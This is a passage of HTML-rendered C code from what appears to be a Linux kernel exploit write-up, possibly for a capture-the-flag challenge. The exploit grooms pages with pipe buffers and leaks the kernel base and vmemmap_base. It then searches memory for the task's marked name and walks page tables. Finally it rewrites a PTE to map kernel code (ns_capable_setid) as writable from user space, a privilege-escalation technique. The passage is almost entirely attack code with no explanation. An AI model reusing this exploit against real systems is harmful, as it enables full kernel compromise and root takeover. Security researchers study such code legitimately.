</span></span><span class="line"><span class="cl">        <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;open successful&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x61&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">determine_spray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">page_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="c1">//low page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add_only</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span><span class="c1">//order-0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">page_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="c1">//high page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x62&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">fcntl</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">F_SETPIPE_SZ</span><span class="p">,</span><span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">/</span><span class="mh">0x40</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span><span class="c1">//order-0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fcntl&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span><span class="c1">//init page struct addr
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">edit</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x201</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="sc">&#39;\x00&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">s1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">s1</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">s2</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;find %d == %d&#34;</span><span class="p">,</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//free order-0 page
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//allocate order-0 page use pipe buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nf">fcntl</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">F_SETPIPE_SZ</span><span class="p">,</span><span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">/</span><span class="mh">0x40</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fcntl&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hexdump</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp_idx</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp_idx</span> <span class="o">=</span> <span class="n">tmp_idx</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;tmp_idx:%d&#34;</span><span class="p">,</span><span class="n">tmp_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1246ec0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;kernel_base:0x%llx&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">vmemmap_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffff0000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;vmemmap_base:%llx&#34;</span><span class="p">,</span><span class="n">vmemmap_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">secondart_startup_addr</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_NAME</span><span class="p">,</span><span class="s">&#34;cnitlrt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">find_addr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">find_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">cred_addr</span><span class="p">,</span><span class="n">task_struct_addr</span><span class="p">,</span><span class="n">mm_struct_addr</span><span class="p">,</span><span class="n">comm_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">arb_read</span><span class="p">(</span><span class="n">vmemmap_base</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">*</span> <span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">find_addr</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="s">&#34;cnitlrt&#34;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">find_data</span> <span class="o">=</span> <span class="n">find_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">find_addr</span> <span class="o">&amp;&amp;</span> <span class="nf">is_heap_pointer</span><span class="p">(</span><span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//cred_addr page_offset_base
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">page_offset_base</span> <span class="o">=</span> <span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffff0000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//mm_sturct_addr 的地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">mm_struct_addr</span> <span class="o">=</span> <span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mh">0x4e</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//page_offset_base + 0x1000*i 获取 task_struct 所在的页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">comm_addr</span> <span class="o">=</span> <span class="n">find_addr</span> <span class="o">-</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mh">0x1000</span> <span class="o">+</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;page_offset_base: 0x%llx&#34;</span><span class="p">,</span><span class="n">page_offset_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;comm_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">comm_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;mm_struct_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">mm_struct_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">mmap_addr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="mh">0x114514000</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">mmap_addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pgd_addr</span><span class="p">,</span><span class="n">pte_addr</span><span class="p">,</span><span class="n">pud_addr</span><span class="p">,</span><span class="n">pmd_addr</span><span class="p">,</span><span class="n">page_addr</span><span class="p">,</span><span class="n">dst_addr</span><span class="p">,</span><span class="n">phy_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">mmap_addr</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">mm_struct_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pgd_addr</span> <span class="o">=</span> <span class="n">data</span><span class="p">[((</span><span class="n">mm_struct_addr</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">dst_addr</span> <span class="o">=</span> <span class="mh">0xeab50</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span><span class="c1">// ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// pte_addr += page_offset_base;//==kernel_base ; + 0xeab50 == ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">phy_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span> <span class="c1">//phy_addr why ? 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">///////////////////////////////////////////////////////////////////////////
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">dst_addr</span> <span class="o">=</span> <span class="n">mmap_addr</span><span class="p">;</span><span class="c1">// ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//==kernel_base ; + 0xeab50 == ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">=</span> <span class="n">phy_addr</span> <span class="o">|</span> <span class="mh">0x8000000000000867</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span><span class="n">data</span><span class="p">,</span><span class="mh">0xff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// dst_addr = mmap_addr + 0x1000;// ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read(dirt(pgd_addr), buf);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pud_addr = (data [PGD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pud_addr += page_offset_base;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read(dirt(pud_addr), buf);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pmd_addr = (data [PUD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pmd_addr += page_offset_base;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read((void*) dirt(pmd_addr), buf);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pte_addr = (data [PMD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr = pte_addr + 0x1000 * PTE_ENTRY(dst_addr);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pte_addr += page_offset_base;//==kernel_base ; + 0xeab50 == __sys_setre
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read((void*) dirt(pte_addr), buf);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr = (data [PTE_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr += page_offset_base;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// data [PTE_ENTRY(dst_addr)] = (phy_addr + 0x1000) | 0x8000000000000867;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_write(dirt(pte_addr), data,0xff0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">obj_addr</span> <span class="o">=</span> <span class="n">page_addr</span> <span class="o">+</span> <span class="nf">PAGE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pgd_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">pgd_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pud_offset: 0x%llx pmd_offset: 0x%llx dst_poffset: 0x%llx pte_offset: 0x%llx page_entry: 0x%llx&#34;</span><span class="p">,</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">),</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">),</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">),</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">),</span><span class="nf">PAGE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pud_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">pud_addr</span><span class="p">);</span>
